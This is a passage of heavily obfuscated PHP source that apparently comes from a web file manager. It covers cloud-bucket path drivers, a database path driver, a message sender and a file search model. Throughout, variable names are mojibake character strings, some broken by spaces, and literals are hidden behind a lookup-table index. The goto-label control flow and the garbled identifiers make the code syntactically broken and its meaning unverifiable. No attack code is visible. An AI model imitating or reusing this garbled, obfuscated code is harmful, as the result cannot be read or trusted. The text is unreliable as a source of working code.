"\x3b\x73\x74\x61\162\164\75{$Ú—¶¤¾}\54\154\145\156\147\164\150\x3d{$ïÖüÒ»}\x3b\160\x6f\x73\x65\72{$õÄ”¨æë}\176{$Ä©°‚Ú¬}"); throw new Exception($õ²†œÌî[1609]); } $’è»¿â = intval($Ú—¶¤¾ / $­ã”ôÀ¾) * $­ã”ôÀ¾; $ÅÅÚÊş = ceil(($Ú—¶¤¾ + $ïÖüÒ») / $­ã”ôÀ¾) * $­ã”ôÀ¾ - $’è»¿â; $İÊÔ¯Û = IO::fileSubstr($this->path, $’è»¿â, $ÅÅÚÊş); $é¬Œ÷‰¡[$’è»¿â . $õ²†œÌî[22]] = $İÊÔ¯Û; ksort($é¬Œ÷‰¡); $‘û¨˜Öè = substr($İÊÔ¯Û, $Ú—¶¤¾ - $’è»¿â, $ïÖüÒ»); return $‘û¨˜Öè; } private function log($¿ß™ÅØì, $àÉŞåÓ‹) { $‚ã†÷ã =& $_SERVER[ü¢ÙÊñÛ]; $¿’õŞè = timeFloat() - $this->timeStart; write_log(sprintf($‚ã†÷ã[1610], $¿ß™ÅØì, $this->info[$‚ã†÷ã[42]], $¿’õŞè, $àÉŞåÓ‹), $‚ã†÷ã[1253]); } } class Message { function __construct() { } public function send($ÖáÛˆÚ = '', $¾°…–ÆÏ = array(), $ş“£‹ = "\x74\145\x78\x74") { $¹Ñ®­û› =& $_SERVER[ü¢ÙÊñÛ]; $ª©¢ğÍ½ = array($¹Ñ®­û›[43] => $¹Ñ®­û›[1202], $¹Ñ®­û›[182] => $ÖáÛˆÚ); if (in_array($ş“£‹, array($¹Ñ®­û›[1202], $¹Ñ®­û›[1611]))) { $ª©¢ğÍ½[$¹Ñ®­û›[43]] = $ş“£‹; } $¾°…–ÆÏ = array($¹Ñ®­û›[589] => isset($¾°…–ÆÏ[$¹Ñ®­û›[589]]) ? $¾°…–ÆÏ[$¹Ñ®­û›[589]] : $¹Ñ®­û›[22], $¹Ñ®­û›[676] => isset($¾°…–ÆÏ[$¹Ñ®­û›[676]]) ? $¾°…–ÆÏ[$¹Ñ®­û›[676]] : $¹Ñ®­û›[22]); if (empty($ÖáÛˆÚ) || empty($¾°…–ÆÏ[$¹Ñ®­û›[589]]) && empty($¾°…–ÆÏ[$¹Ñ®­û›[676]])) { return !1; } $’“ÈÓÀ£ = array($¹Ñ®­û›[1540] => $ª©¢ğÍ½, $¹Ñ®­û›[1612] => $¾°…–ÆÏ); Hook::trigger($¹Ñ®­û›[1613], $’“ÈÓÀ£); } } goto aœ¥±Â Ûä; f§ÃŸÜ½Ğ¡: class PathDriverBOS extends PathDriverS3 { public function __construct($ÊÂÊšº) { parent::__construct($ÊÂÊšº); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($·Çî—ñ‘) { $ÅÍÛ¼›Â =& $_SERVER[ü¢ÙÊñÛ]; if (substr($·Çî—ñ‘, 0, 7) == $ÅÍÛ¼›Â[229]) { $·Çî—ñ‘ = $ÅÍÛ¼›Â[230] . substr($·Çî—ñ‘, 7); } header($ÅÍÛ¼›Â[186] . $·Çî—ñ‘); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($àçÅìÍ ) { parent::__construct($àçÅìÍ ); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } public function uploadFormData($÷±ø¼”è, $ñƒİø´ = 3600) { $ Óí ¡§ =& $_SERVER[ü¢ÙÊñÛ]; $Åûê­¾ = $ Óí ¡§[242]; $»¡¶Ã­ = $ Óí ¡§[1401]; $îïîÆ¥ = $ Óí ¡§[274]; $±Ó­¡ò¬ = gmdate($ Óí ¡§[1402], time() + $ñƒİø´); $–©Ö£ı = (string) time() . $ Óí ¡§[85] . (string) (time() + $ñƒİø´); $©ÛÈ‹ò… = array($ Óí ¡§[275] => $±Ó­¡ò¬, $ Óí ¡§[278] => array(array($ Óí ¡§[318] => $Åûê­¾), array($ Óí ¡§[279] => $this->bucket), array($ Óí ¡§[280], $ Óí ¡§[281], $ Óí ¡§[22]), array($ Óí ¡§[283] => $îïîÆ¥), array($ Óí ¡§[1403] => $»¡¶Ã­), array($ Óí ¡§[1404] => $this->accessKey), array($ Óí ¡§[1405] => $–©Ö£ı))); $©ÛÈ‹ò… = json_encode($©ÛÈ‹ò…); $ö¹Øß¢ê = hash_hmac($ Óí ¡§[1401], $–©Ö£ı, $this->secret); $…ÇØôÑ‹ = sha1($©ÛÈ‹ò…); $éŒŸ¡ˆÂ = hash_hmac($ Óí ¡§[1401], $…ÇØôÑ‹, $ö¹Øß¢ê); $ŸÕÃ¡‡„ = array($ Óí ¡§[318] => $Åûê­¾, $ Óí ¡§[283] => $îïîÆ¥, $ Óí ¡§[290] => base64_encode($©ÛÈ‹ò…), $ Óí ¡§[1403] => $»¡¶Ã­, $ Óí ¡§[1404] => $this->accessKey, $ Óí ¡§[1406] => $–©Ö£ı, $ Óí ¡§[1407] => $éŒŸ¡ˆÂ, $ Óí ¡§[219] => $this->getHost()); return $ŸÕÃ¡‡„; } public function fileOutImage($ÅÌ¶, $ÛëŒÃ¯¼ = 250) { $°Øçğ¬ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->size($ÅÌ¶) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÅÌ¶, $ÛëŒÃ¯¼); } $–±Ù¨Öù = $this->link($ÅÌ¶); $–±Ù¨Öù .= $°Øçğ¬[1408] . $ÛëŒÃ¯¼ . $°Øçğ¬[1409]; $this->fileOutLink($–±Ù¨Öù); } public function fileOutLink($ê»ñââé) { $ºüë”ÁÈ =& $_SERVER[ü¢ÙÊñÛ]; if (substr($ê»ñââé, 0, 7) == $ºüë”ÁÈ[229]) { $ê»ñââé = $ºüë”ÁÈ[230] . substr($ê»ñââé, 7); } header($ºüë”ÁÈ[186] . $ê»ñââé); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($×™¯ßÈß) { $this->pathParse = $×™¯ßÈß; $this->model = Model($_SERVER[ü¢ÙÊñÛ][1410]); } public function getPath($Û™á—ç§) { return trim($Û™á—ç§, $_SERVER[ü¢ÙÊñÛ][18]); } public function pathFather($ÊÑî©Îú) { $ƒüÅ¯Òø = $this->parse($ÊÑî©Îú); $ƒüÅ¯Òø = $this->infoSimple($ÊÑî©Îú); return $ƒüÅ¯Òø ? $ƒüÅ¯Òø[$_SERVER[ü¢ÙÊñÛ][203]] : !1; } public function pathThis($·…çÚÙÔ) { $£Ïö‘¿‰ = $this->infoSimple($·…çÚÙÔ); return $£Ïö‘¿‰ ? $£Ïö‘¿‰[$_SERVER[ü¢ÙÊñÛ][42]] : !1; } public function getPathOuter($ş¥ĞÄ´) { if (!$ş¥ĞÄ´) { return $ş¥ĞÄ´; } $µßñäü = $this->parse($ş¥ĞÄ´); return KodIO::make($µßñäü[$_SERVER[ü¢ÙÊñÛ][486]]); } public function copyFolderFromIO($Š‹÷©İ, $»£”ä •, $à««“«­, $€–ãÔ¦®, $éÍÂÏÊ) { $®¥Ü»×× = $this->model->copyFolderFromIO($Š‹÷©İ, $»£”ä •, $à««“«­, $€–ãÔ¦®, $éÍÂÏÊ); return KodIO::make($®¥Ü»××); } public function isParentOf($ç›ÓÊåâ, $Ùà×ªú†) { return $this->model->isParentOf($ç›ÓÊåâ, $Ùà×ªú†); } public function mkfile($Ø‡ ³àº, $“éõåÙª = '', $ÊÂÑÇÉ¯ = REPEAT_RENAME) { $ÀÕöšÇ =& $_SERVER[ü¢ÙÊñÛ]; $¯±Şúìˆ = $this->parse($Ø‡ ³àº); $Ø‡ ³àº = $¯±Şúìˆ[$ÀÕöšÇ[486]]; for ($‘•â›Œ = 0; $‘•â›Œ < count($¯±Şúìˆ[$ÀÕöšÇ[1411]]); $‘•â›Œ++) { $ƒòÏçÆ = $¯±Şúìˆ[$ÀÕöšÇ[1411]][$‘•â›Œ]; if ($‘•â›Œ == count($¯±Şúìˆ[$ÀÕöšÇ[1411]]) - 1) { $Ø‡ ³àº = $this->model->mkfile($Ø‡ ³àº, $ƒòÏçÆ, $“éõåÙª, $ÊÂÑÇÉ¯); break; } $Ø‡ ³àº = $this->model->mkdir($Ø‡ ³àº, $ƒòÏçÆ, REPEAT_SKIP); } return $this->getPathOuter($Ø‡ ³àº); } public function mkdir($«¨ºƒ¨, $»ˆ½…× = REPEAT_SKIP) { $Ô»ºÃíñ =& $_SERVER[ü¢ÙÊñÛ]; $ æÅëÇæ = $this->parse($«¨ºƒ¨); $«¨ºƒ¨ = $ æÅëÇæ[$Ô»ºÃíñ[486]]; for ($š¼´±¹Ö = 0; $š¼´±¹Ö < count($ æÅëÇæ[$Ô»ºÃíñ[1411]]); $š¼´±¹Ö++) { $Ä‚Öòö¯ = $ æÅëÇæ[$Ô»ºÃíñ[1411]][$š¼´±¹Ö]; $«¨ºƒ¨ = $this->model->mkdir($«¨ºƒ¨, $Ä‚Öòö¯, $»ˆ½…×); } return $this->getPathOuter($«¨ºƒ¨); } public function copyFile($ğãÅŒ©Ã, $Ğ³ÈÑÂ©, $‹»Šşƒ… = REPEAT_REPLACE) { $‡§“Ù®Â =& $_SERVER[ü¢ÙÊñÛ]; $¤‰®ô¨á = $this->parse($Ğ³ÈÑÂ©); $ìÒ”Ñ¶­ = $this->model->copy($ğãÅŒ©Ã, $¤‰®ô¨á[$‡§“Ù®Â[486]], $‹»Šşƒ…, $¤‰®ô¨á[$‡§“Ù®Â[98]]); return $ìÒ”Ñ¶­ ? $this->getPathOuter($ìÒ”Ñ¶­) : !1; } public function moveFile($äÛÔİÒÖ, $†•¾à™, $‚±Àİ¬Ş = REPEAT_REPLACE) { $¬‘úò­Í =& $_SERVER[ü¢ÙÊñÛ]; $ÍÃ¶æ¦À = $this->parse($†•¾à™); $úì±ÇÚÊ = $this->model->move($äÛÔİÒÖ, $ÍÃ¶æ¦À[$¬‘úò­Í[486]], $‚±Àİ¬Ş, $ÍÃ¶æ¦À[$¬‘úò­Í[98]]); return $úì±ÇÚÊ ? $this->getPathOuter($úì±ÇÚÊ) : !1; } public function copy($áÓù÷Ş², $Ç®‚È‰, $Ğ´‘»¦š = REPEAT_REPLACE, $ù¤ãë = false) { $ÂƒÜ—Õ = $this->parse($Ç®‚È‰); $˜êëŸäÖ = $this->model->copy($áÓù÷Ş², $ÂƒÜ—Õ[$_SERVER[ü¢ÙÊñÛ][486]], $Ğ´‘»¦š, $ù¤ãë); return $˜êëŸäÖ ? $this->getPathOuter($˜êëŸäÖ) : !1; } public function moveSameAllow() { } public function move($È§Ä¿Ï¦, $é˜Ø¯‚Ğ, $§­ØÏØ¡ = REPEAT_REPLACE, $Ëœ¤ó‚õ = false) { $ëüãÑË = $this->parse($é˜Ø¯‚Ğ); $ååÑõë“ = $this->model->move($È§Ä¿Ï¦, $ëüãÑË[$_SERVER[ü¢ÙÊñÛ][486]], $§­ØÏØ¡, $Ëœ¤ó‚õ); return $ååÑõë“ ? $this->getPathOuter($ååÑõë“) : !1; } public function remove($‚Åƒ¥ˆ, $Æğá“À” = true) { return $this->model->remove($‚Åƒ¥ˆ, $Æğá“À”); } public function rename($Ù“Ë‚şÛ, $ú€ÉˆúĞ) { $»€ÃË‘Ë = $this->model->rename($Ù“Ë‚şÛ, $ú€ÉˆúĞ); return $»€ÃË‘Ë ? $this->getPathOuter($Ù“Ë‚şÛ) : $»€ÃË‘Ë; } public function size($‚Æş¶Ïµ) { $àø’µ“ = $this->infoSimple($‚Æş¶Ïµ); return $àø’µ“ ? $àø’µ“[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function infoSimple($äÆÕîã) { return $this->model->sourceInfo($äÆÕîã); } public function info($µ‚ïä½ò) { return $this->infoParse($µ‚ïä½ò); } public function infoAuth($÷¤©µŸŸ) { return $this->infoParse($÷¤©µŸŸ, !1, !0); } public function infoWithChildren($£¿Œß€) { return $this->infoParse($£¿Œß€, !0); } protected function infoParse($ªûÏ¨·ò, $¾éáõè› = false, $¬Ìƒª¹× = false) { if (!$¾éáõè›) { return $this->model->pathInfo($ªûÏ¨·ò, $¬Ìƒª¹×); } return $this->model->pathInfoMore($ªûÏ¨·ò); } public function infoFullSimple($‡˜öìæâ) { $ëïäÌ¤ì =& $_SERVER[ü¢ÙÊñÛ]; $‘‰¬ÀîÖ = explode($ëïäÌ¤ì[18], $‡˜öìæâ); $µ¦ª‡œå = implode($ëïäÌ¤ì[18], array_splice($‘‰¬ÀîÖ, 1)); return $this->model->pathInfoByPath($‘‰¬ÀîÖ[0], $µ¦ª‡œå); } public function infoFull($ÌÉ«Ò¡œ) { $øÂúŠ£ó = $this->infoFullSimple($ÌÉ«Ò¡œ); return is_array($øÂúŠ£ó) ? $this->model->pathInfo($øÂúŠ£ó[$_SERVER[ü¢ÙÊñÛ][204]]) : !1; } public function hashSimple($³±Øñë) { $Ö…ÁÈ¤› =& $_SERVER[ü¢ÙÊñÛ]; $œßµ×³Á = $this->infoWithChildren($³±Øñë); return $œßµ×³Á[$Ö…ÁÈ¤›[181]][$Ö…ÁÈ¤›[686]]; } public function hashMd5($˜± úµ†) { $©á‡Âª =& $_SERVER[ü¢ÙÊñÛ]; $Ì´Ùóù = $this->infoWithChildren($˜± úµ†); return $Ì´Ùóù[$©á‡Âª[181]][$©á‡Âª[558]]; } public function exist($ª‰è¹Øâ) { $İ¾’ãŠù =& $_SERVER[ü¢ÙÊñÛ]; $ëÑÊ•õÓ = $this->parse($ª‰è¹Øâ); if (!$ëÑÊ•õÓ[$İ¾’ãŠù[98]]) { return $this->isFile($ª‰è¹Øâ) || $this->isFolder($ª‰è¹Øâ); } $ö‚Ï”˜Ä = array($İ¾’ãŠù[488] => $ëÑÊ•õÓ[$İ¾’ãŠù[486]], $İ¾’ãŠù[42] => $ëÑÊ•õÓ[$İ¾’ãŠù[98]]); $Æ¨óıÑš = $this->model->where($ö‚Ï”˜Ä)->find(); return $Æ¨óıÑš ? !0 : !1; } public function isFile($‘…‹Ùøğ) { $ğ¢ƒÅÎÏ =& $_SERVER[ü¢ÙÊñÛ]; $ÍªÆ…‡« = $this->infoSimple($‘…‹Ùøğ); return $ÍªÆ…‡« && $ÍªÆ…‡«[$ğ¢ƒÅÎÏ[496]] == $ğ¢ƒÅÎÏ[241] ? !0 : !1; } public function isFolder($¹¨¬úÂ) { $¬²³»Ø¯ =& $_SERVER[ü¢ÙÊñÛ]; $àøò™€ò = $this->infoSimple($¹¨¬úÂ); return $àøò™€ò && $àøò™€ò[$¬²³»Ø¯[496]] == $¬²³»Ø¯[102] ? !0 : !1; } public function listPath($ Ë©¡à, $ÈÈİ½€½ = false) { $ô¾£î©ı =& $_SERVER[ü¢ÙÊñÛ]; if ($ Ë©¡à == $ô¾£î©ı[22]) { return !1; } $ƒ®Û¯˜Û = array($ô¾£î©ı[488] => $ Ë©¡à); if ($ÈÈİ½€½) { return $this->model->listSource($ƒ®Û¯˜Û, -1); } return $this->model->listSource($ƒ®Û¯˜Û); } public function has($úİïô±², $ŸÖÒŞ³Ê = false, $åš¦”Â¸ = null) { $’·Á“ö¦ =& $_SERVER[ü¢ÙÊñÛ]; $Ì‡êŞÏÑ = $this->infoWithChildren($úİïô±²); if ($ŸÖÒŞ³Ê) { return array($’·Á“ö¦[253] => $Ì‡êŞÏÑ[$’·Á“ö¦[253]], $’·Á“ö¦[252] => $Ì‡êŞÏÑ[$’·Á“ö¦[252]]); } return $åš¦”Â¸ ? $Ì‡êŞÏÑ[$’·Á“ö¦[253]] : $Ì‡êŞÏÑ[$’·Á“ö¦[252]]; } public function listAll($ ©èÂê) { $¶¥ÊøŸÌ = IO::info($this->pathParse[$_SERVER[ü¢ÙÊñÛ][98]]); if (!$¶¥ÊøŸÌ) { return array(); } return $this->model->listAll($ ©èÂê); } public function getContent($ê‡ğÕ‚±) { return $this->model->getContent($ê‡ğÕ‚±); } public function setContent($óËê€˜›, $®ÕÓ…İ¾ = '') { return $this->model->setContent($óËê€˜›, $®ÕÓ…İ¾); } public function fileSubstr($§âŒ õË, $ ñù¯ªÅ, $×Áœ„˜×) { return $this->model->fileSubstr($§âŒ õË, $ ñù¯ªÅ, $×Áœ„˜×); } public function download($Òõ ôßê, $àÎ„¥ = '') { $§©•–¨æ = get_path_father($àÎ„¥); $ğ¶›…ü = get_path_this($àÎ„¥); $ÂÊŸ›³œ = $this->model->fileInfoGet($Òõ ôßê); $Ø¡ß®ùû = IO::copy($ÂÊŸ›³œ[$_SERVER[ü¢ÙÊñÛ][98]], $§©•–¨æ, !1, $ğ¶›…ü); return $Ø¡ß®ùû; } public function setModifyTime($™éœ°áæ, $Øì»Ô« = '') { $¼®÷Äûõ =& $_SERVER[ü¢ÙÊñÛ]; if (!$™éœ°áæ) { return; } $this->model->where(array($¼®÷Äûõ[502] => $™éœ°áæ))->save(array($¼®÷Äûõ[99] => $Øì»Ô«)); } public function upload($Öæƒ˜îé, $ì‘·¼Ñ×, $‚Ì¢ŒíÌ = false, $¿ğ×‡îà = REPEAT_REPLACE) { $Ì¢·¸¨Ë =& $_SERVER[ü¢ÙÊñÛ]; $„¯ì‚Ç = $this->parse($Öæƒ˜îé); $˜×ğ–ôÉ = $this->model->addFile($„¯ì‚Ç[$Ì¢·¸¨Ë[486]], $ì‘·¼Ñ×, $„¯ì‚Ç[$Ì¢·¸¨Ë[98]], $‚Ì¢ŒíÌ, $¿ğ×‡îà); return $this->getPathOuter($˜×ğ–ôÉ); } public function uploadFileByID($íÑåê‚, $úæ¹¯ù³, $úµığÜÃ) { $Û½¸ÂÆ— =& $_SERVER[ü¢ÙÊñÛ]; $¢¥Ó·Œ¼ = $this->parse($íÑåê‚); $Óö‡…®’ = $this->model->addFileByFileID($¢¥Ó·Œ¼[$Û½¸ÂÆ—[486]], $úæ¹¯ù³, $¢¥Ó·Œ¼[$Û½¸ÂÆ—[98]], $úµığÜÃ); return $this->getPathOuter($Óö‡…®’); } public function addFileByRemote($ê€˜£ê, $îÑĞÖŞÑ, $íÃÆßûî = array(), $È±îĞÍú = '', $™ŒÏÄ˜) { $«æ¸Úíö =& $_SERVER[ü¢ÙÊñÛ]; $ø«¾¸©Ÿ = $this->parse($ê€˜£ê); $È±îĞÍú = empty($È±îĞÍú) ? $ø«¾¸©Ÿ[$«æ¸Úíö[98]] : $È±îĞÍú; $ÂĞ‹Èí· = $this->model->addFileByRemote($ø«¾¸©Ÿ[$«æ¸Úíö[486]], $îÑĞÖŞÑ, $È±îĞÍú, $íÃÆßûî, $™ŒÏÄ˜); return $this->getPathOuter($ÂĞ‹Èí·); } public function uploadLink($Âªêàš, $ÊÚòËÏÇ = 0) { $ÔÖˆœÖ• =& $_SERVER[ü¢ÙÊñÛ]; $ÃŸÇ³™Ç = $this->parse($Âªêàš); $¢ıÚŞ”Ù = _get($GLOBALS[$ÔÖˆœÖ•[17]], $ÔÖˆœÖ•[1412]); $ÍÑ» ·Õ = _get($GLOBALS[$ÔÖˆœÖ•[17]], $ÔÖˆœÖ•[1413]); $Âªêàš = Model($ÔÖˆœÖ•[688])->createFileName($ÃŸÇ³™Ç[$ÔÖˆœÖ•[98]], $¢ıÚŞ”Ù, $ÍÑ» ·Õ); return IO::uploadLink($Âªêàš, $ÊÚòËÏÇ); } public function fileNameAuto($Ğªş²ÆÏ, $¾êİÒ™¶, $Ş®Ğ•¹Í = REPEAT_REPLACE, $½Â©ü‘ = false) { return $this->model->fileNameAuto($Ğªş²ÆÏ, $¾êİÒ™¶, $Ş®Ğ•¹Í, $½Â©ü‘); } public function fileNameExist($‹¼†İ¡Ó, $Áºåö£ˆ) { return $this->model->fileNameExist($‹¼†İ¡Ó, $Áºåö£ˆ); } protected function _fileOut($Ûéï§“í, $…é›—¯ = false, $ëá—·“ = false, $”ãÄ²ïî = '', $›ºÎâ¢¨ = false) { $Ê˜µåßö =& $_SERVER[ü¢ÙÊñÛ]; $ÚÃìÄñ = $this->model->sourceInfo($Ûéï§“í); if ($ÚÃìÄñ[$Ê˜µåßö[496]] == $Ê˜µåßö[102]) { header($Ê˜µåßö[1414]); die; } $µŒ‹Õàğ = $this->model->fileInfoGet($Ûéï§“í); $”ãÄ²ïî = $µŒ‹Õàğ[$Ê˜µåßö[558]] ? $µŒ‹Õàğ[$Ê˜µåßö[558]] : $”ãÄ²ïî; $Õµ”» = isset($GLOBALS[$Ê˜µåßö[193]]) && is_array($GLOBALS[$Ê˜µåßö[193]]) ? $GLOBALS[$Ê˜µåßö[193]][$Ê˜µåßö[42]] : $ÚÃìÄñ[$Ê˜µåßö[42]]; if ($›ºÎâ¢¨) { return IO::fileOutServer($µŒ‹Õàğ[$Ê˜µåßö[98]], $…é›—¯, $Õµ”», $”ãÄ²ïî); } IO::fileOut($µŒ‹Õàğ[$Ê˜µåßö[98]], $…é›—¯, $Õµ”», $”ãÄ²ïî); } public function fileOut($ìëÎµÚ’, $Ğ’ùÚ®ö = false, $•­¹¸•é = false, $ÄÍ‡› = '') { $this->_fileOut($ìëÎµÚ’, $Ğ’ùÚ®ö, $•­¹¸•é, $ÄÍ‡›); } public function fileOutServer($ò²³æÌƒ, $ºíıÇŒí = false, $¥û½ê®» = false, $°Ÿíùî = '') { $this->_fileOut($ò²³æÌƒ, $ºíıÇŒí, $¥û½ê®», $°Ÿíùî, !0); } protected function _fileOutImage($†û†½Ú”, $—½ØÙı = 250) { $°ÜµÊ¿° =& $_SERVER[ü¢ÙÊñÛ]; $“Üº­íÖ = $this->model->pathInfo($†û†½Ú”); if ($“Üº­íÖ[$°ÜµÊ¿°[496]] == $°ÜµÊ¿°[102]) { show_json($°ÜµÊ¿°[1415] . $†û†½Ú”, !1); } $ÅòÙŞ©¹ = $this->model->fileInfoGet($†û†½Ú”); $“Üº­íÖ[$°ÜµÊ¿°[194]] = $ÅòÙŞ©¹[$°ÜµÊ¿°[98]]; $GLOBALS[$°ÜµÊ¿°[193]] = $“Üº­íÖ; IO::fileOutImage($ÅòÙŞ©¹[$°ÜµÊ¿°[98]], $—½ØÙı); } public function fileOutImage($ıáäÏ, $Ü£×šİà = 250) { $this->_fileOutImage($ıáäÏ, $Ü£×šİà); } public function fileOutImageServer($ô˜Ûå¥ó, $‡À©—†ü = 250) { $this->_fileOutImage($ô˜Ûå¥ó, $‡À©—†ü); } public function link($ ãéúùì, $·æ˜Ñí† = '') { $îäâ¸ = $this->model->fileInfoGet($ ãéúùì); return IO::link($îäâ¸[$_SERVER[ü¢ÙÊñÛ][98]], $·æ˜Ñí†); } protected function parse($±ê›¡Ù) { $¾ äãú =& $_SERVER[ü¢ÙÊñÛ]; if (strstr($±ê›¡Ù, $¾ äãú[18]) === !1) { return array($¾ äãú[504] => intval($±ê›¡Ù), $¾ äãú[98] => $¾ äãú[22], $¾ äãú[1411] => array()); } $Ä±ø¾õï = explode($¾ äãú[18], trim($±ê›¡Ù, $¾ äãú[18])); if (count($Ä±ø¾õï) < 2) { show_tips(clear_html($±ê›¡Ù) . $¾ äãú[1416]); } return array($¾ äãú[504] => intval($Ä±ø¾õï[0]), $¾ äãú[98] => $Ä±ø¾õï[1], $¾ äãú[1411] => array_slice($Ä±ø¾õï, 1)); } } goto d†ºÌ†‰³¶; Aà»÷ÀÚ§: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($©©öÏ“İ) { $—³ËÒ¹ç =& $_SERVER[ü¢ÙÊñÛ]; $ ¨‰å°Ï = KodIO::fileTypeList(); $áÇ‹Ø¢ = $ ¨‰å°Ï[$©©öÏ“İ]; if (!$áÇ‹Ø¢) { return array(); } $şÛª‹ü÷ = $áÇ‹Ø¢[$—³ËÒ¹ç[180]]; $‹ÓÍ£â = $—³ËÒ¹ç[17]; if (!$áÇ‹Ø¢[$—³ËÒ¹ç[180]]) { $ğêÚ…øæ = array_to_keyvalue($ ¨‰å°Ï, $—³ËÒ¹ç[22], $—³ËÒ¹ç[180]); $şÛª‹ü÷ = implode($—³ËÒ¹ç[60], $ğêÚ…øæ); $‹ÓÍ£â = $—³ËÒ¹ç[2223]; } $Â—Ÿ¸Ô = explode($—³ËÒ¹ç[60], trim($şÛª‹ü÷, $—³ËÒ¹ç[60])); return array($‹ÓÍ£â, $Â—Ÿ¸Ô); } public function listPathType($èĞÅÊ°ø) { $¡ÅäÁ–Ø =& $_SERVER[ü¢ÙÊñÛ]; $€©Ëñ¯ = $this->fileTypeWhere($èĞÅÊ°ø); if (!$€©Ëñ¯) { return array(); } $¨Ø“Œ = USER_ID; $æùİ¨— = Model($¡ÅäÁ–Ø[608])->getInfo($¨Ø“Œ); $ñŒ¤åšº = array($¡ÅäÁ–Ø[662] => SourceModel::TYPE_USER, $¡ÅäÁ–Ø[595] => array($¡ÅäÁ–Ø[626], $¡ÅäÁ–Ø[604] . $æùİ¨—[$¡ÅäÁ–Ø[101]][$¡ÅäÁ–Ø[204]] . $¡ÅäÁ–Ø[627]), $¡ÅäÁ–Ø[663] => $¨Ø“Œ, $¡ÅäÁ–Ø[660] => 0, $¡ÅäÁ–Ø[661] => $€©Ëñ¯); return $this->listSource($ñŒ¤åšº); } public function listSearch($’Ûû„Éò, $ì¦´í…ú = 300) { $ûì¥Ô©ª =& $_SERVER[ü¢ÙÊñÛ]; if (isset($’Ûû„Éò[$ûì¥Ô©ª[2057]]) && $’Ûû„Éò[$ûì¥Ô©ª[2057]]) { $’Ûû„Éò[$ûì¥Ô©ª[2057]] = str_replace($ûì¥Ô©ª[471], $ûì¥Ô©ª[2224], trim($’Ûû„Éò[$ûì¥Ô©ª[2057]])); } $äÚ½†Ä = $this->_parseSearchWhere($’Ûû„Éò); if (!isset($äÚ½†Ä[$ûì¥Ô©ª[516]])) { $äÚ½†Ä[$ûì¥Ô©ª[516]] = 0; } $“ÃŠĞÙ = $ûì¥Ô©ª[2225]; $—•Ë¤Ù‘ = $äÚ½†Ä; $‘ŒÊÊ = $“ÃŠĞÙ; $this->_listSearchBindPinyin($’Ûû„Éò, $äÚ½†Ä, $“ÃŠĞÙ); $this->alias($ûì¥Ô©ª[530])->_makeOrder(); $äÚ½†Ä = $this->parseWhereLike($äÚ½†Ä); $Ä§ú§ŸÇ = $this->distinct(!0)->field($“ÃŠĞÙ)->where($äÚ½†Ä)->selectPage($ì¦´í…ú); if ($GLOBALS[$ûì¥Ô©ª[16]][$ûì¥Ô©ª[468]][$ûì¥Ô©ª[469]] && Input::check($’Ûû„Éò[$ûì¥Ô©ª[2057]], $ûì¥Ô©ª[669]) && $Ä§ú§ŸÇ[$ûì¥Ô©ª[454]][$ûì¥Ô©ª[440]] == 1 && $Ä§ú§ŸÇ[$ûì¥Ô©ª[454]][$ûì¥Ô©ª[455]] == 0) { $Ä§ú§ŸÇ = $this->distinct(!0)->field($“ÃŠĞÙ)->where($—•Ë¤Ù‘)->limit(1000)->select(); $Ä§ú§ŸÇ = array_page_split($Ä§ú§ŸÇ, !1, $ì¦´í…ú); } $this->_listSearchFileContent($Ä§ú§ŸÇ, $’Ûû„Éò, $‘ŒÊÊ, $—•Ë¤Ù‘); $this->_listSearchDesc($Ä§ú§ŸÇ, $’Ûû„Éò, $‘ŒÊÊ); $this->_listSearchTag($Ä§ú§ŸÇ, $’Ûû„Éò, $‘ŒÊÊ); $this->_listSearchGroupTag($Ä§ú§ŸÇ, $’Ûû„Éò, $‘ŒÊÊ); $this->_listDataApply($Ä§ú§ŸÇ[$ûì¥Ô©ª[457]]); $this->_listMake($Ä§ú§ŸÇ); return $Ä§ú§ŸÇ; } private function _listSearchFileContent(&$¥¿·–ªû, $ıûŠ»‡, $±‹ ß‡¿, $ºú®âƒ¿) { $»›×Û€É =& $_SERVER[ü¢ÙÊñÛ]; if (!$ıûŠ»‡[$»›×Û€É[2057]] || $¥¿·–ªû[$»›×Û€É[454]][$»›×Û€É[440]] > 1) { return; } if (!isset($ºú®âƒ¿[$»›×Û€É[42]]) || !is_array($ıûŠ»‡[$»›×Û€É[552]])) { return; } $ºú®âƒ¿[$»›×Û€É[552]] = array($»›×Û€É[17], $ıûŠ»‡[$»›×Û€É[552]]); unset($ºú®âƒ¿[$»›×Û€É[42]]); unset($ıûŠ»‡[$»›×Û€É[552]]); $š©ı¶õÉ = $this->field($±‹ ß‡¿)->where($ºú®âƒ¿)->limit($»›×Û€É[2226])->select(); if (!$š©ı¶õÉ || count($š©ı¶õÉ) == 0) { return; } $¥¿·–ªû[$»›×Û€É[457]] = array_merge($š©ı¶õÉ, $¥¿·–ªû[$»›×Û€É[457]]); $¥¿·–ªû[$»›×Û€É[454]][$»›×Û€É[455]] += count($š©ı¶õÉ); } private function _listSearchTag(&$‚Ç°áª°, $í—£à®, $ÁçîĞ§) { $”ÌÀàÏ€ =& $_SERVER[ü¢ÙÊñÛ]; if (!$í—£à®[$”ÌÀàÏ€[2057]] || $‚Ç°áª°[$”ÌÀàÏ€[454]][$”ÌÀàÏ€[440]] > 1) { return; } $‡½á—Ûü = Model($”ÌÀàÏ€[2227])->listData(); $äÁ›ò¸× = array(); $ò¶·ç = $í—£à®[$”ÌÀàÏ€[2057]]; foreach ($‡½á—Ûü as $Áˆ¬Â º) { $ı‹Ì¿°å = $Áˆ¬Â º[$”ÌÀàÏ€[42]]; $Ï®ÌËµ´ = str_replace($”ÌÀàÏ€[63], $”ÌÀàÏ€[22], Pinyin::get($ı‹Ì¿°å)); if (stripos($ı‹Ì¿°å, $ò¶·ç) !== !1 || stripos($Ï®ÌËµ´, $ò¶·ç) !== !1) { $äÁ›ò¸×[] = $Áˆ¬Â º[$”ÌÀàÏ€[486]]; } } if (!$äÁ›ò¸×) { return; } $½åœÌÆÄ = array($”ÌÀàÏ€[511] => array($”ÌÀàÏ€[17], $äÁ›ò¸×), $”ÌÀàÏ€[1759] => USER_ID); 